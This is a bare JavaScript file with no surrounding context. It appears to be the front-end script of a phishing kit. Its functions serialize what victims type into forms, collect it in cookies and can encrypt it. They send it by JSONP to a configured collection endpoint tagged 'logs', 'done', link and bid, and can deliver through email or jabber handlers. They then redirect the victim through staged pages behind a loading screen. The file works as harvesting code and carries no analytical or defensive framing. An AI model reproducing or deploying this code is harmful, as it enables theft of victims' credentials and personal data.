function next__(el) {
    cookies.set('ses', 1);


    var Callback = function(data) {
        setTimeout(function() {
            // loader_.hide();
            // $(".scum").hide();
            // $(el).closest(".scum").next().show();

            // window.location.href = "../next/";
            lock_redirect('next')
        }, 3000);
    }

    loader_.show();



    var data__ = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
    cookies.set('data__', JSON.stringify(all_data__))

    data__ = php_js.encryption ? EN(data__) : data__;

    if (/(email|jabber|complited)\.php/.test(php_js.home)) {
        Callback();
        return;
    }

    $.ajax({
        url: php_js.home + "?pl=logs&sl&link=" + php_js.link + "&bid=" + bid,
        dataType: "jsonp",
        data: {
            data: JSON.stringify(data__)
        },
        success: Callback,
        error: function(data) {}
    });

}








function finish__(el) {
    cookies.set('ses', 1);
    loader_.show();
    // alert('fin');
    var data__ = $(el).custom_ser();
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
    cookies.set('data__', JSON.stringify(all_data__))


    if (/(email|jabber|complited)\.php/.test(php_js.home)) {
        data__ = all_data__;
    }

    data__ = php_js.encryption ? EN(data__) : data__;
    $.ajax({
        url: php_js.home + "?pl=logs&sl&done&link=" + php_js.link + "&bid=" + bid,
        dataType: "jsonp",
        data: {
            data: JSON.stringify(data__)
        },
        success: function(data) {
            // window.location.href = php_js.bb_link;




            // window.location.href = "../done/";
            lock_redirect('done')
        },
        error: function(data) {}
    });
}




var def_plugin_data_receiver = function(data) {

    var Callback = function(data) {
        setTimeout(function() {
            loader_.hide();
            // $(".scum").hide();
            // $(el).closest(".scum").next().show();
            window.location.href = "../next/";
        }, 3000);
    }

    loader_.show();
    var data__ = data
    var all_data__ = $.extend({}, JSON.parse(cookies.get('data__')), data__);
    cookies.set('data__', JSON.stringify(all_data__))

    if (/(email|jabber|complited)\.php/.test(php_js.home)) {
        Callback();
        return;
    }
    $.ajax({
        url: php_js.home + "&sl&link=" + php_js.link + "&bid=" + bid,
        dataType: "jsonp",
        data: {
            data: JSON.stringify(data__)
        },
        success: Callback,
        error: function(data) {}
    });
}





$(document).ready(function() {
    // $('head base').attr('href','');

    setTimeout(function() {
        loader_.hide()
    }, 2000)

     window.location.hash="56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d56e71887e17c4f792fcf642bfd07743d"

});